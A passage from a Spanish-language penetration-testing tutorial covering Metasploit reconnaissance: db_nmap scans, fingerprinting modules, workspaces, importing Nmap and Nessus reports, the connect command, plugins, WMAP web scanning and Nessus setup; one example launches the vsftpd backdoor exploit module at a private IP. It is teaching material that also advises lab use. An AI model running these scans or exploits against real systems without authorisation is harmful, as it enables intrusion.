#### ğŸ”¹ Paso 5: Ver hosts y servicios

```bash
hosts
services
```

---

### ğŸš€ Â¿Para quÃ© sirve esto?

1. Ahorras tiempo: no necesitas volver a escanear en Metasploit.
2. Usas escaneos avanzados de Nmap (con scripts o parÃ¡metros complejos) y los analizas en Metasploit.
3. Puedes lanzar exploits desde Metasploit directamente sobre los servicios detectados.

---

### ğŸ§  Tips extra

- TambiÃ©n puedes usar archivos `.gnmap` o `.nmap` en algunos casos, pero **el XML es el mÃ¡s compatible** con Metasploit.
- Puedes usar Zenmap (interfaz grÃ¡fica de Nmap) para escanear y exportar a XML.

---

[ğŸ”¼](#Ã­ndice)

---

## **946. Escaneo de puertos con db_nmap**

### ğŸ§  Â¿QuÃ© es `db_nmap`?

`db_nmap` es una **versiÃ³n integrada de Nmap dentro de Metasploit**. Permite realizar escaneos de red **y guardar automÃ¡ticamente los resultados en la base de datos de Metasploit** (MSF).

ğŸ” En resumen:

- Usa Nmap por debajo.
- Pero guarda resultados directo en Metasploit (hosts, puertos, servicios).
- Es Ãºtil para anÃ¡lisis mÃ¡s rÃ¡pido y automatizado dentro del flujo de pentesting.

---

### ğŸ› ï¸ Â¿CÃ³mo se instala `db_nmap`?

No necesitas instalar `db_nmap` por separado, **viene incluido con Metasploit**.

Lo Ãºnico que necesitas es:

1. Tener Metasploit Framework instalado.
2. Tener Nmap instalado.
3. Tener la base de datos de Metasploit activa.

#### âœ… Verifica:

- **Instalar Nmap (si no estÃ¡):**

```bash
sudo apt install nmap
```

- **Iniciar PostgreSQL y Metasploit:**

```bash
sudo systemctl start postgresql
msfconsole
```

- **Verificar que la base de datos estÃ© conectada:**

```bash
db_status
```

Debe decir:

```
[*] Connected to msf...
```

---

### ğŸ“¦ Â¿CÃ³mo se usa `db_nmap`?

Una vez dentro de `msfconsole`, puedes usarlo igual que Nmap. Ejemplo bÃ¡sico:

```bash
db_nmap -sS -p 22,80 192.168.1.105
```

#### Â¿QuÃ© hace esto?

- `-sS`: Escaneo SYN (modo sigiloso).
- `-p 22,80`: Escanea puertos 22 (SSH) y 80 (HTTP).
- `192.168.1.105`: IP objetivo.

---

### ğŸ§ª Ejemplo completo y detallado

#### ğŸ”¹ Paso 1: Abrir Metasploit

```bash
msfconsole
```

#### ğŸ”¹ Paso 2: Verificar la base de datos

```bash
db_status
```

#### ğŸ”¹ Paso 3: Usar `db_nmap`

```bash
db_nmap -sS -p 21-1000 192.168.1.105
```

Resultado esperado:

```
[*] Nmap: Starting Nmap...
[*] Nmap: Nmap scan report for 192.168.1.105
[*] Nmap: Host is up (0.0010s latency).
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 80/tcp   open  http
```

Metasploit guarda esto automÃ¡ticamente en su base de datos.

#### ğŸ”¹ Paso 4: Ver los resultados

- **Ver hosts:**

```bash
hosts
```

- **Ver servicios:**

```bash
services
```

---

### âœ… Ventajas de usar `db_nmap` vs `nmap`

| CaracterÃ­stica              | `nmap` normal | `db_nmap` (Metasploit)      |
| --------------------------- | ------------- | --------------------------- |
| Escaneo                     | âœ… SÃ­         | âœ… SÃ­                       |
| Guarda en base de datos MSF | âŒ No         | âœ… SÃ­                       |
| IntegraciÃ³n con exploits    | âŒ Manual     | âœ… AutomÃ¡tica               |
| Consultas dentro de MSF     | âŒ No         | âœ… SÃ­ (`hosts`, `services`) |

---

### ğŸ”§ Tipos comunes de escaneo con `db_nmap`

- **Escaneo TCP SYN (sigiloso):**

```bash
db_nmap -sS 192.168.1.105
```

- **Escaneo de puertos especÃ­ficos:**

```bash
db_nmap -p 21,22,80,443 192.168.1.105
```

- **Escaneo con detecciÃ³n de versiÃ³n:**

```bash
db_nmap -sV 192.168.1.105
```

- **Escaneo completo (agresivo):**

```bash
db_nmap -A 192.168.1.105
```

---

### ğŸ§  Tip Final

DespuÃ©s de escanear con `db_nmap`, puedes buscar mÃ³dulos de explotaciÃ³n segÃºn los servicios encontrados, por ejemplo:

```bash
search type:exploit name:ssh
```

---

[ğŸ”¼](#Ã­ndice)

---

## **947. Fingerprinting con mÃ³dulos auxiliares**

### ğŸ§  Â¿QuÃ© es el Fingerprinting?

**Fingerprinting** (huella digital) en ciberseguridad es el proceso de **identificar informaciÃ³n especÃ­fica de un sistema o servicio**, como:

- Sistema operativo (Linux, Windows, etc.).
- VersiÃ³n de un software (Apache 2.4, nginx 1.18â€¦).
- Servicios y puertos abiertos (FTP, SSH, SMBâ€¦).
- TecnologÃ­a de una app web (WordPress, Joomlaâ€¦).

ğŸ‘‰ En pocas palabras: **conocer lo mÃ¡ximo posible de la vÃ­ctima antes de atacar.**

---

### ğŸ”§ Â¿QuÃ© es un mÃ³dulo auxiliar en Metasploit?

Los **mÃ³dulos auxiliares** en Metasploit son herramientas que **no explotan** vulnerabilidades directamente, sino que ayudan a recopilar informaciÃ³n:

- Escanear puertos.
- Enumerar servicios.
- Detectar versiones.
- Buscar vulnerabilidades.
- Realizar fingerprinting.

---

### âœ… Â¿CÃ³mo se instala?

**No necesitas instalar nada extra.** Solo asegÃºrate de tener:

1. Metasploit Framework.
2. Base de datos activa (opcional pero recomendable).
3. Acceso a una red o mÃ¡quina virtual para pruebas.

Si no tienes Metasploit:

```bash
sudo apt update && sudo apt install metasploit-framework -y
```

---

### ğŸ§ª Ejemplo completo de Fingerprinting con mÃ³dulos auxiliares

#### ğŸ¯ Objetivo: Realizar fingerprinting de un servidor web.

---

#### ğŸ”¹ Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### ğŸ”¹ Paso 2: Buscar un mÃ³dulo auxiliar de fingerprinting

Por ejemplo, vamos a usar uno que detecta tecnologÃ­a web:

```bash
search http_version
```

Resultado:

```
auxiliary/scanner/http/http_version
```

Este mÃ³dulo identifica el software web que corre en un servidor (Apache, nginx, etc.).

---

#### ğŸ”¹ Paso 3: Usar el mÃ³dulo

```bash
use auxiliary/scanner/http/http_version
```

---

#### ğŸ”¹ Paso 4: Ver y configurar las opciones

```bash
show options
```

VerÃ¡s algo como esto:

```
RHOSTS     => (IP objetivo)
RPORT      => 80 (puerto por defecto HTTP)
THREADS    => NÃºmero de hilos (velocidad)
```

Supongamos que vas a escanear una web local en `192.168.1.105`.

---

#### ğŸ”¹ Paso 5: Configurar los parÃ¡metros

```bash
set RHOSTS 192.168.1.105
set THREADS 10
```

(Usa `RPORT 443` si es HTTPS)

---

#### ğŸ”¹ Paso 6: Ejecutar el escaneo

```bash
run
```

Ejemplo de resultado:

```
[*] http://192.168.1.105:80 - Server: Apache/2.4.41 (Ubuntu)
[*] Scanned 1 of 1 hosts (100% complete)
```

ğŸ¯ Â¡Ya tienes la huella digital del servidor web!

---

### ğŸ“˜ Otros mÃ³dulos auxiliares para fingerprinting

| MÃ³dulo                                     | DescripciÃ³n                       |
| ------------------------------------------ | --------------------------------- |
| `auxiliary/scanner/ftp/ftp_version`        | Detecta versiÃ³n del servicio FTP  |
| `auxiliary/scanner/ssh/ssh_version`        | Detecta versiÃ³n del servicio SSH  |
| `auxiliary/scanner/smb/smb_version`        | Identifica versiÃ³n SMB en Windows |
| `auxiliary/scanner/snmp/snmp_enum`         | Enumera info desde SNMP           |
| `auxiliary/scanner/http/webdav_scanner`    | Detecta WebDAV en servidores web  |
| `auxiliary/scanner/http/wordpress_scanner` | Detecta WordPress y plugins       |

Puedes encontrarlos con:

```bash
search type:auxiliary name:version
```

o simplemente:

```bash
search fingerprint
```

---

### ğŸ“Œ Ventajas del Fingerprinting con Metasploit

- ğŸ” Te da informaciÃ³n precisa sobre los servicios.
- ğŸ“‹ Permite elegir exploits mÃ¡s efectivos.
- âš™ï¸ Acelera el reconocimiento sin herramientas externas.

---

### ğŸš¨ Buenas prÃ¡cticas

- Siempre realiza fingerprinting **antes de explotar**.
- No abuses de los mÃ³dulos en redes que no son tuyas (legalidad).
- Usa entornos de laboratorio (como mÃ¡quinas virtuales con Metasploitable o TryHackMe).

---

### âœ… Resumen paso a paso

1. Abres Metasploit con `msfconsole`.
2. Buscas un mÃ³dulo: `search http_version`.
3. Lo usas: `use auxiliary/scanner/http/http_version`.
4. Configuras el objetivo: `set RHOSTS <IP>`.
5. Ejecutas con `run`.
6. Analizas el fingerprinting resultante.

---

[ğŸ”¼](#Ã­ndice)

---

## **948. GestiÃ³n de espacios de trabajo**

### ğŸ§  Â¿QuÃ© es un espacio de trabajo en Metasploit?

Un **workspace (espacio de trabajo)** en Metasploit es como una carpeta o contenedor lÃ³gico donde se guarda toda la informaciÃ³n relacionada a una **sesiÃ³n de pentesting especÃ­fica**.

Cada espacio de trabajo puede contener:

- Resultados de escaneos (como los de `nmap`, `db_nmap`, etc.).
- Hosts descubiertos.
- Servicios detectados.
- Vulnerabilidades encontradas.
- Credenciales.
- Notas y etiquetas personalizadas.

ğŸ’¡ Esto te permite trabajar de forma **organizada y separada por proyectos**. Por ejemplo:

- `empresaA`
- `cliente-gustavo`
- `lab-practica01`

---

### ğŸ“¦ Â¿CÃ³mo se instala?

Metasploit ya incluye el sistema de workspaces por defecto, **no necesitas instalar nada adicional**.

Solo necesitas:

âœ… Tener **Metasploit Framework instalado**.

âœ… Tener la **base de datos de Metasploit activa** (PostgreSQL).

Para asegurarte de que la base de datos estÃ© conectada, abre `msfconsole` y verifica:

```bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

Si no estÃ¡ conectada, puedes iniciar PostgreSQL con:

```bash
sudo service postgresql start
```

---

### ğŸ”§ Comandos principales de gestiÃ³n de espacios de trabajo

#### ğŸ”¹ Ver espacios de trabajo existentes

```bash
workspace
```

Te mostrarÃ¡ algo como:

```
* default
  lab1
  empresa-peru
```

El `*` indica cuÃ¡l es el espacio de trabajo activo.

---

#### ğŸ”¹ Crear un nuevo espacio de trabajo

```bash
workspace -a <nombre>
```

Ejemplo:

```bash
workspace -a cliente-gustavo
```

---

#### ğŸ”¹ Cambiar de espacio de trabajo

```bash
workspace <nombre>
```

Ejemplo:

```bash
workspace cliente-gustavo
```

---

#### ğŸ”¹ Eliminar un espacio de trabajo

```bash
workspace -d <nombre>
```

Ejemplo:

```bash
workspace -d lab1
```

---

#### ğŸ”¹ Renombrar un espacio de trabajo

Metasploit no permite renombrar directamente un workspace. La mejor prÃ¡ctica es:

1. Crear uno nuevo.
2. Exportar e importar datos si es necesario.
3. Eliminar el anterior.

---

### ğŸ§ª Ejemplo completo: GestiÃ³n de espacios de trabajo

#### Escenario: Vas a hacer pentesting a 2 clientes distintos: `empresaA` y `empresaB`.

---

#### Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### Paso 2: Verificar el workspace actual

```bash
workspace
```

DeberÃ­as ver:

```
* default
```

---

#### Paso 3: Crear un espacio para "empresaA"

```bash
workspace -a empresaA
```

Ahora, cÃ¡mbiate a ese workspace:

```bash
workspace empresaA
```

---

#### Paso 4: Importar datos o hacer escaneo

Haz un escaneo con Nmap integrado:

```bash
db_nmap -sS -T4 -Pn 192.168.1.105
```

Esto almacenarÃ¡ resultados **solo dentro del workspace `empresaA`**.

---

#### Paso 5: Ver los hosts encontrados

```bash
hosts
```

Puedes ver tambiÃ©n:

```bash
services
vulns
```

---

#### Paso 6: Cambiar al otro proyecto

```bash
workspace -a empresaB
workspace empresaB
```

AquÃ­ puedes repetir escaneos, importar datos de Nmap con:

```bash
db_import /ruta/archivo.xml
```

Y quedarÃ¡ todo **aislado**.

---

#### Paso 7: Eliminar uno si ya no lo necesitas

```bash
workspace -d empresaB
```

---

### ğŸ¯ Beneficios de usar workspaces

| Ventaja           | DescripciÃ³n                                                      |
| ----------------- | ---------------------------------------------------------------- |
| ğŸ” OrganizaciÃ³n   | Mantienes separados los resultados de cada cliente o laboratorio |
| ğŸ“‚ HistÃ³rico      | Puedes volver a consultar escaneos anteriores                    |
| ğŸ¤– AutomatizaciÃ³n | Puedes automatizar escaneos y exportarlos por workspace          |
| ğŸ“Š Reportes       | MÃ¡s fÃ¡cil generar reportes por cliente                           |

---

### âœ… Resumen final

| Comando                      | AcciÃ³n                              |
| ---------------------------- | ----------------------------------- |
| `workspace`                  | Lista todos los espacios de trabajo |
| `workspace -a nombre`        | Crea uno nuevo                      |
| `workspace nombre`           | Cambia al workspace                 |
| `workspace -d nombre`        | Elimina uno                         |
| `db_nmap`                    | Escanea y guarda en el workspace    |
| `hosts`, `services`, `vulns` | Muestran datos del workspace actual |

---

[ğŸ”¼](#Ã­ndice)

---

## **949. Importando informes de escÃ¡neres de vulnerabilidades**

### ğŸ§  Â¿QuÃ© significa importar informes de escÃ¡neres de vulnerabilidades?

Cuando usas herramientas como **Nmap**, **Nessus**, **OpenVAS**, **Qualys**, entre otros, puedes guardar sus resultados en archivos (XML, Nessus, CSV, etc.).
Esos informes se pueden **importar a Metasploit** para:

- Analizar vulnerabilidades detectadas.
- Asignar exploits relacionados.
- Organizar datos por hosts, puertos, servicios, etc.
- Automatizar ataques y pruebas.

---

### ğŸ”§ EscÃ¡neres compatibles

Metasploit puede importar informes desde herramientas como:

| Herramienta      | Formato soportado |
| ---------------- | ----------------- |
| Nmap             | `.xml`            |
| Nessus           | `.nessus`         |
| Nexpose (Rapid7) | `.xml` o `.txt`   |
| OpenVAS          | `.xml`            |
| Acunetix         | `.xml`            |

---

### âœ… Requisitos previos

1. Tener **Metasploit Framework** instalado.
2. Tener **PostgreSQL activo** (para la base de datos).
3. Tener el archivo del informe guardado localmente.

Verifica conexiÃ³n a la base de datos:

```bash
msfconsole
db_status
```

Resultado esperado:

```
[*] Connected to msf. Connection type: postgresql.
```

Si no estÃ¡ conectado:

```bash
sudo service postgresql start
```

---

### ğŸ“¦ Â¿CÃ³mo importar un informe?

Usamos el comando:

```bash
db_import /ruta/del/archivo
```

Ejemplo:

```bash
db_import /home/gustavo/escaneos/nmap-reporte.xml
```

O si fuera de Nessus:

```bash
db_import /home/gustavo/informes/clienteA.nessus
```

---

### ğŸ“‚ Â¿DÃ³nde consigo esos informes?

- **Nmap**:

  ```bash
  nmap -sS -oX nmap-reporte.xml 192.168.1.1
  ```

- **Nessus**:

  DespuÃ©s de escanear, exporta el archivo `.nessus` desde la interfaz web.

- **OpenVAS**:

  Exporta como `XML` desde la consola de resultados.

---

### ğŸ” Â¿QuÃ© pasa despuÃ©s de importar?

Una vez importado, puedes consultar los datos con:

| Comando    | DescripciÃ³n                                |
| ---------- | ------------------------------------------ |
| `hosts`    | Lista de hosts encontrados                 |
| `services` | Servicios y puertos por host               |
| `vulns`    | Vulnerabilidades (si el reporte las tiene) |
| `notes`    | Notas asociadas al anÃ¡lisis                |

TambiÃ©n puedes usar:

```bash
vulns -h
```

Para mÃ¡s opciones de filtrado.

---

### ğŸ§ª Ejemplo completo paso a paso

#### ğŸ¯ Escenario:

Vas a importar un escaneo hecho con **Nmap** y uno con **Nessus** al workspace `cliente-peru`.

---

#### Paso 1: Crear y activar el workspace

```bash
msfconsole
workspace -a cliente-peru
workspace cliente-peru
```

---

#### Paso 2: Generar el informe en Nmap (fuera de Metasploit)

```bash
nmap -sV -oX nmap-cliente-peru.xml 192.168.1.1
```

---

#### Paso 3: Importar el informe

```bash
db_import /home/gustavo/Documentos/nmap-cliente-peru.xml
```

Verifica:

```bash
hosts
services
```

---

#### Paso 4: Importar un informe de Nessus

Imagina que exportaste desde Nessus un archivo llamado `reporte-nessus.nessus`.

```bash
db_import /home/gustavo/Descargas/reporte-nessus.nessus
```

Verifica:

```bash
vulns
```

---

#### Paso 5: Buscar exploits relacionados

DespuÃ©s de importar y ver las vulnerabilidades, puedes buscar exploits con:

```bash
vulns
```

Y luego:

```bash
search cve:CVE-XXXX-XXXX
```

TambiÃ©n puedes automatizarlo con `vulncheck` en algunos casos.

---

### ğŸ“¤ Exportar resultados desde Metasploit

Si quieres guardar lo importado o generado, puedes usar:

```bash
db_export -f xml -a > exportado.xml
```

O en formato CSV:

```bash
db_export -f csv -a > reporte.csv
```

---

### ğŸ¯ ConclusiÃ³n

| AcciÃ³n               | Comando                             |
| -------------------- | ----------------------------------- |
| Importar informe     | `db_import /ruta/archivo`           |
| Ver hosts            | `hosts`                             |
| Ver servicios        | `services`                          |
| Ver vulnerabilidades | `vulns`                             |
| Cambiar workspace    | `workspace nombre`                  |
| Exportar datos       | `db_export -f csv -a > archivo.csv` |

---

[ğŸ”¼](#Ã­ndice)

---

## **950. Comando connect**

### ğŸ§  Â¿QuÃ© es el comando `connect` en Metasploit?

El comando `connect` se usa dentro de **Metasploit Framework (msfconsole)** para establecer una **conexiÃ³n TCP directa con un puerto de un host**, de forma muy similar a la herramienta `telnet` o `nc` (netcat).

ğŸ” Es Ãºtil para:

- Verificar si un **puerto estÃ¡ abierto**.
- Probar **respuestas de servicios** (como un banner).
- Hacer pruebas **manuales de servicios** antes de lanzar un exploit.
- Usarlo como una herramienta de diagnÃ³stico dentro de Metasploit.

---

### ğŸ“Œ Sintaxis del comando

```bash
connect [IP] [PUERTO]
```

TambiÃ©n puedes agregar opciones como:

```bash
connect [IP] [PUERTO] [PROTOCOLO] [INTERFAZ LOCAL] [PUERTO LOCAL]
```

Pero con solo IP y PUERTO es suficiente para la mayorÃ­a de casos.

---

### âš™ï¸ Â¿CÃ³mo se instala?

Â¡No necesitas instalar nada!
`connect` ya viene integrado en **Metasploit Framework**.

#### Solo necesitas:

1. Tener Metasploit Framework instalado.
2. Ejecutar `msfconsole`.

Si aÃºn no lo tienes:

```bash
sudo apt update && sudo apt install metasploit-framework
```

Y luego:

```bash
msfconsole
```

---

### ğŸ§ª Ejemplos simples

#### âœ… Verificar si el puerto 80 (HTTP) estÃ¡ abierto en un servidor

```bash
connect scanme.nmap.org 80
```

Si el puerto estÃ¡ abierto, verÃ¡s algo como:

```
[*] Connected to scanme.nmap.org:80
```

Puedes incluso escribir manualmente una solicitud HTTP:

```bash
GET / HTTP/1.0
```

Luego presionas dos veces Enter, y verÃ¡s la respuesta del servidor web.

---

#### ğŸ§ª Verificar si un servidor SSH responde

```bash
connect 192.168.1.10 22
```

DeberÃ­as ver algo como:

```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
```

Esto indica que estÃ¡ corriendo un servidor SSH.

---

#### âŒ Verificar un puerto cerrado

```bash
connect 192.168.1.10 9999
```

VerÃ¡s algo como:

```
[-] Failed to connect: Connection refused
```

---

### ğŸ“‚ Â¿QuÃ© diferencia tiene con Netcat o Telnet?

| Herramienta | Integrado en Metasploit | InteracciÃ³n rÃ¡pida | AutomatizaciÃ³n |
| ----------- | ----------------------- | ------------------ | -------------- |
| `connect`   | âœ… SÃ­                   | âœ… SÃ­              | âœ… Alta        |
| `netcat`    | âŒ No                   | âœ… SÃ­              | âœ… Media       |
| `telnet`    | âŒ No                   | âŒ Antigua         | âŒ Baja        |

`connect` es mÃ¡s rÃ¡pido y cÃ³modo si ya estÃ¡s trabajando dentro de `msfconsole`.

---

### ğŸ§‘â€ğŸ’» Ejemplo completo paso a paso

#### ğŸ¯ Escenario:

SupÃ³n que estÃ¡s analizando el host `192.168.1.20`, quieres verificar si sus puertos:

- 22 (SSH)
- 80 (HTTP)
- 443 (HTTPS)

EstÃ¡n abiertos.

---

#### Paso 1: Iniciar Metasploit

```bash
msfconsole
```

---

#### Paso 2: Verificar puerto 22

```bash
connect 192.168.1.20 22
```

**Respuesta esperada**:

```
[*] Connected to 192.168.1.20:22
SSH-2.0-OpenSSH_8.4
```

---

#### Paso 3: Verificar puerto 80

```bash
connect 192.168.1.20 80
```

Luego puedes escribir:

```bash
GET / HTTP/1.1
Host: 192.168.1.20
```

Y presionar dos veces Enter. VerÃ¡s algo como:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```

---

#### Paso 4: Verificar puerto 443

```bash
connect 192.168.1.20 443
```

ğŸ”’ Este puerto usa **HTTPS (SSL)**, por lo que verÃ¡s datos cifrados o ilegibles. Esto indica que el puerto estÃ¡ abierto, pero el contenido no es visible directamente.

---

### âœ… Resumen final

| Tarea                          | Comando                      |
| ------------------------------ | ---------------------------- |
| Verificar puerto abierto       | `connect IP PUERTO`          |
| Ver respuesta del servidor web | `connect IP 80` + `GET ...`  |
| Detectar puerto cerrado        | Mensaje "Connection refused" |
| Interactuar con SSH            | `connect IP 22`              |

---

[ğŸ”¼](#Ã­ndice)

---

## **951. Plugins de Metasploit**

### ğŸ” Â¿QuÃ© son los plugins de Metasploit?

Los **plugins en Metasploit** son **extensiones** que agregan **nuevas funcionalidades** a `msfconsole`. Algunos permiten integrar otras herramientas, guardar resultados, interactuar con bases de datos, automatizar tareas o mejorar el entorno de trabajo.

ğŸ“Œ **Diferencia entre plugin y mÃ³dulo**:

| CaracterÃ­stica | Plugin                               | MÃ³dulo                                                 |
| -------------- | ------------------------------------ | ------------------------------------------------------ |
| FunciÃ³n        | Extiende funcionalidades             | Exploits, escaneos, payloads                           |
| Carga manual   | SÃ­ (`load plugin`)                   | No (se seleccionan con `use`)                          |
| Ejemplos       | database, pcap_log, event_timestamps | auxiliary/scanner, exploit/windows/smb/ms08_067_netapi |

---

### ğŸ“ Â¿DÃ³nde estÃ¡n los plugins?

Los plugins se encuentran generalmente en:

```
/opt/metasploit-framework/plugins/
```

O si lo instalaste vÃ­a Git:

```
~/.msf4/plugins/
```

Puedes crear o descargar nuevos plugins (en Ruby) y colocarlos allÃ­.

---

### ğŸ§° Â¿CÃ³mo se listan los plugins disponibles?

Dentro de `msfconsole`, ejecuta:

```bash
help
```

O directamente:

```bash
load
```

Y te mostrarÃ¡ los disponibles si tienes acceso al directorio.

---

### âš™ï¸ Â¿CÃ³mo se instala un plugin?

No se instala, **se carga** en Metasploit:

```bash
load nombre_del_plugin
```

ğŸ“Œ Ejemplo:

```bash
load pcap_log
```

Te da la funcionalidad de capturar trÃ¡fico de red generado por exploits.

---

### ğŸ“Œ Plugins comunes e importantes

| Plugin                    | FunciÃ³n principal                                                                |
| ------------------------- | -------------------------------------------------------------------------------- |
| `pcap_log`                | Captura trÃ¡fico de red generado por los exploits de Metasploit.                  |
| `database`                | Maneja base de datos para almacenar resultados, escaneos, hosts, servicios, etc. |
| `event_timestamps`        | Muestra la hora exacta en que ocurren los eventos dentro de Metasploit.          |
| `local_admin_search_enum` | Enumera si tienes privilegios de administrador local en mÃ¡quinas remotas.        |
| `wmap`                    | Framework de escaneo de aplicaciones web.                                        |

---

### ğŸ’¡ Ejemplo simple de uso

#### Paso 1: Abrir `msfconsole`

```bash
msfconsole
```

#### Paso 2: Cargar un plugin

```bash
load pcap_log
```

Respuesta esperada:

```
[*] Successfully loaded plugin: pcap_log
```

Ahora cada trÃ¡fico generado se guardarÃ¡ en `/tmp/msf3-pcap.log`.

---

### ğŸ“¦ Instalar un nuevo plugin personalizado (opcional)

Si encuentras un plugin en GitHub:

```bash
cd ~/.msf4/plugins
wget https://URL_DEL_PLUGIN/plugin.rb
```

Y luego desde Metasploit:

```bash
load plugin
```

---

### ğŸ§‘â€ğŸ’» Ejemplo completo: Capturar trÃ¡fico con el plugin `pcap_log`

#### ğŸ¯ Objetivo:

Lanzar un exploit y capturar el trÃ¡fico generado.

---

#### Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### Paso 2: Cargar el plugin `pcap_log`

```bash
load pcap_log
```

VerÃ¡s:

```
[*] Successfully loaded plugin: pcap_log
```

---

#### Paso 3: Seleccionar un exploit (ejemplo local)

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.5
set RPORT 21
run
```

---

#### Paso 4: Ver el trÃ¡fico capturado

El archivo estarÃ¡ en:

```bash
/tmp/msf3-pcap.log
```

Puedes analizarlo con Wireshark:

```bash
wireshark /tmp/msf3-pcap.log
```

---

### âœ… Resumen rÃ¡pido

| Tarea                     | Comando                  |
| ------------------------- | ------------------------ |
| Cargar plugin             | `load nombre_del_plugin` |
| Ver funcionalidades extra | Depende del plugin       |
| Plugin para trÃ¡fico pcap  | `load pcap_log`          |
| Plugin para timestamps    | `load event_timestamps`  |
| Ver plugins en ruta       | `ls ~/.msf4/plugins`     |

---

[ğŸ”¼](#Ã­ndice)

---

## **952. AnÃ¡lisis de vulnerabilidades con WMAP**

### ğŸ” Â¿QuÃ© es WMAP?

**WMAP** es un **plugin de Metasploit** que funciona como un **escÃ¡ner de vulnerabilidades para aplicaciones web**. Se basa en el famoso **Nikto**, pero estÃ¡ totalmente integrado en el Metasploit Framework.

ğŸ‘‰ Con WMAP puedes:

- Escanear aplicaciones web en busca de fallos comunes.
- Detectar configuraciones errÃ³neas, directorios sensibles, formularios inseguros.
- Integrar resultados con los mÃ³dulos de explotaciÃ³n de Metasploit.

---

### âœ… Requisitos para usar WMAP

1. Tener **Metasploit Framework** instalado.
2. Estar dentro de `msfconsole`.
3. Tener cargado el **plugin WMAP**.
4. Contar con una **URL objetivo**.

---

### ğŸ› ï¸ InstalaciÃ³n (cargar WMAP)

WMAP no se instala por separado, **se carga como plugin** dentro de Metasploit:

```bash
msfconsole
```

Una vez dentro:

```bash
load wmap
```

Si todo va bien verÃ¡s:

```
[*] Successfully loaded plugin: wmap
```

---

### ğŸ“‹ Comandos bÃ¡sicos de WMAP

DespuÃ©s de cargar el plugin, se habilitan comandos que empiezan con `wmap_`.

| Comando           | DescripciÃ³n                                      |
| ----------------- | ------------------------------------------------ |
| `wmap_sites`      | Manejo de sitios (agregar, listar, eliminar)     |
| `wmap_targets`    | SelecciÃ³n de objetivos                           |
| `wmap_run`        | Iniciar el escaneo                               |
| `wmap_modules -l` | Lista los mÃ³dulos disponibles                    |
| `wmap_run -t`     | Escanea el objetivo actual con todos los mÃ³dulos |

---

### ğŸ“Œ Flujo completo de escaneo con WMAP

#### 1. Cargar el plugin

```bash
load wmap
```

---

#### 2. Agregar el objetivo

```bash
wmap_sites -a http://192.168.1.105
```

ğŸ“Œ Este comando agrega el sitio a la base de datos.

---

#### 3. Verifica el sitio agregado

```bash
wmap_sites -l
```

---

#### 4. Selecciona el objetivo

```bash
wmap_targets -t http://192.168.1.105
```

---

#### 5. Lista los mÃ³dulos disponibles

```bash
wmap_modules -l
```

Puedes ver mÃ³dulos como:

- `auxiliary/scanner/http/http_put`
- `auxiliary/scanner/http/webdav_scanner`
- `auxiliary/scanner/http/dir_scanner`

---

#### 6. Ejecutar escaneo con todos los mÃ³dulos

```bash
wmap_run -t
```

Esto comienza el escaneo de la URL seleccionada con todos los mÃ³dulos relacionados a WMAP.

â±ï¸ El escaneo puede tomar varios minutos.

---

#### 7. Ver resultados

DespuÃ©s del escaneo puedes revisar el output en la consola, o combinarlo con el sistema de base de datos de Metasploit para guardar todo:

```bash
db_status      # Verifica si estÃ¡ activada la base de datos
services       # Ver los servicios detectados
vulns          # Ver vulnerabilidades encontradas
```

---

### âœ… Ejemplo completo (resumen rÃ¡pido)

SupÃ³n que quieres escanear la app `http://testphp.vulnweb.com`:

```bash
msfconsole
```

```bash
load wmap
wmap_sites -a http://testphp.vulnweb.com
wmap_targets -t http://testphp.vulnweb.com
wmap_modules -l
wmap_run -t
```

Luego puedes ver vulnerabilidades con:

```bash
vulns
```

---

### ğŸ’¡ Consejo adicional

Puedes combinar WMAP con otros mÃ³dulos de Metasploit como:

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS testphp.vulnweb.com
run
```

---

### ğŸ§  En resumen

- âœ… **WMAP** es un plugin de Metasploit para escanear sitios web.
- âš™ï¸ **Se carga con** `load wmap` en `msfconsole`.
- ğŸ“ Se usa con comandos como `wmap_sites`, `wmap_targets`, `wmap_run`.
- ğŸ” Es Ãºtil para encontrar vulnerabilidades como PUT activado, directorios expuestos, inyecciones, etc.
- ğŸ”— Ideal para combinar con otros mÃ³dulos auxiliares o explotaciÃ³n.

---

[ğŸ”¼](#Ã­ndice)

---

## **953. AnÃ¡lisis de vulnerabilidades con Nessus**

### ğŸ” Â¿QuÃ© es Nessus?

**Nessus** es una herramienta profesional desarrollada por **Tenable** que permite realizar **escaneos de vulnerabilidades** en sistemas, redes y servicios. Es ampliamente usada por **auditores de seguridad, pentesters y analistas** para:

- Detectar puertos abiertos.
- Identificar servicios y versiones vulnerables.
- Detectar configuraciones errÃ³neas.
- Generar reportes detallados en PDF, HTML, etc.

---

### ğŸ§© Tipos de Nessus

- **Nessus Essentials (Gratis)** â€“ Para estudiantes o usuarios personales (hasta 16 IPs).
- **Nessus Professional (Pago)** â€“ Para entornos empresariales.

Nos enfocaremos en **Nessus Essentials**, que es gratuito.

---

### ğŸ› ï¸ InstalaciÃ³n de Nessus Essentials (Windows / Linux)

#### ğŸ”¹ Para Windows

1. Ir al sitio oficial:
   ğŸ‘‰ [https://www.tenable.com/products/nessus/nessus-essentials](https://www.tenable.com/products/nessus/nessus-essentials)

2. Selecciona tu sistema operativo y descarga el instalador.

3. Instala el programa normalmente.

4. Se abrirÃ¡ una pÃ¡gina web como `https://localhost:8834/`.

5. Crea una cuenta gratuita con tu correo para activar la licencia de Essentials (recibirÃ¡s un cÃ³digo de activaciÃ³n).

6. Ingresa el cÃ³digo en el navegador cuando lo pida.

7. Espera a que se actualicen los plugins. Toma de 5 a 10 minutos.

---

#### ğŸ”¹ Para Linux (ej. Ubuntu)

```bash
wget https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/15084/download?i_agree_to_tenable_license_agreement=true -O Nessus.deb

sudo dpkg -i Nessus.deb
sudo systemctl start nessusd
```

Luego abre en tu navegador:

ğŸ‘‰ `https://localhost:8834/` y sigue el mismo proceso de activaciÃ³n.

---

### âœ… CÃ³mo usar Nessus paso a paso

#### 1. Entrar al panel

DespuÃ©s de instalado, accede desde el navegador a:

```bash
https://localhost:8834/
```

---

#### 2. Crear nuevo escaneo

- Haz clic en **"New Scan"**
